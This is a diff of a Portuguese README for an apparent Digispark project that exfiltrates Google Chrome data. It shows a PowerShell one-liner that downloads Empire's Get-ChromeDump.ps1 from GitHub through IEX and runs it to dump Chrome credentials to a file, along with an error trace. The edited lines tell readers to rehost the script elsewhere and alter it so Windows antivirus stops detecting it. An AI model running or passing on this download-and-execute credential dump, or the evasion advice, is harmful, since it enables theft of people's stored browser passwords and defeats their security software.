@@ -1,4 +1,4 @@
-# Esse projeto parece não estar mais funcionando devido ao antivirus
+# Esse projeto é detectado pelo antivirus do windows pois muitas pessoas usaram o link padrão do GetChromeDump.ps1 diretamente do repositorio do EmpireProject, então baixe o GetChromeDump up em outro github e faça modificações no código para não ser detectado
 PS C:\WINDOWS\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'); Get-ChromeDump -OutFile 'C:\l\ChromeDump.txt'
 IEX : No linha:1 caractere:1
 + Function Get-ChromeDump{
@@ -19,7 +19,7 @@ No linha:1 caractere:162
     + CategoryInfo          : ObjectNotFound: (Get-ChromeDump:String) [], CommandNotFoundException
     + FullyQualifiedErrorId : CommandNotFoundException
     
-# tente baixar o arquivo Get-ChromeDump.ps1 e upar em outro servidor, depois aponte para o servidor onde ele foi upado
+# tente baixar o arquivo Get-ChromeDump.ps1 e upar em outro git, modifique algo no script para não ser detectado pelo antivirus.
 
 
 # Usando o digispark para exfiltrar dados do google chrome
